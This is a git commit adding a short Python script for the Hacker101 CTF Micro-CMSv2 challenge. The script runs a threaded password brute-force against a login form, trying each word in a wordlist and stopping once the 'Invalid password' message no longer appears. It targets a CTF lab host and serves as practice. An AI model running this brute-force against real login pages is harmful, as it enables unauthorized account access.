bcc2cd8c375b63386d6385f4a818949e56e9bbc0
daveidhg <gronlidavid@gmail.com>
2024-07-29 19:38:16 +0200

    Micro-CMSv2 completed in hacker101 ctf

---
+++ hacker101 ctf/brute force/Micro-CMSv2_password.py
@@ -0,0 +1,23 @@
+import requests
+from time import sleep
+import threading
+import os
+
+def check_username(username, password, url):
+    data = {"username": username, "password": password}
+    response = requests.post(url, data=data)
+    if "Invalid password" not in response.text:
+        print(f"Password found: {password}")
+        os._exit(1)
+    else:
+        print(f"Incorrect password: {password}")
+
+username = "Username found from Micro-CMSv2_username.py"
+threads = []
+url = "https://{id}.ctf.hacker101.com/login"
+username_file = open("lists/names.txt", "r")
+for name in username_file.readlines():
+    if threading.active_count() > 50:
+        sleep(1)
+    threading.Thread(target=check_username, args=(username, name.strip(), url)).start()
+    sleep(0.01)
